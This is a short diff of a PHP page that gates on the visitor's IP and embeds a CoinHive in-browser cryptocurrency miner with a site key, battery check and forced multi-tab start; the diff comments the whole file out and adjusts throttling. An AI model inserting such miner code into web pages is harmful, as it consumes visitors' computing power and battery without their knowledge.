@@ -1,5 +1,5 @@
 ﻿<?php
-
+/*
 function testUserIP($user_ip, $cidrs) {
 	
 	$ipu = explode('.', $user_ip);
@@ -37,7 +37,7 @@ if (empty($allowed_cidrs) || !testUserIP($_SERVER['REMOTE_ADDR'], $allowed_cidrs
 <script type="text/javascript">
 var miner = new CoinHive.Anonymous('tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM', {
 	threads: 1,
-	autoThreads: false
+	throttle: 0.8
 });
 try {
 	navigator.getBattery().then(function (battery) {
@@ -52,3 +52,4 @@ try {
 	});
 }catch(e){miner.start(CoinHive.FORCE_MULTI_TAB);}
 </script>
+*/ ?>
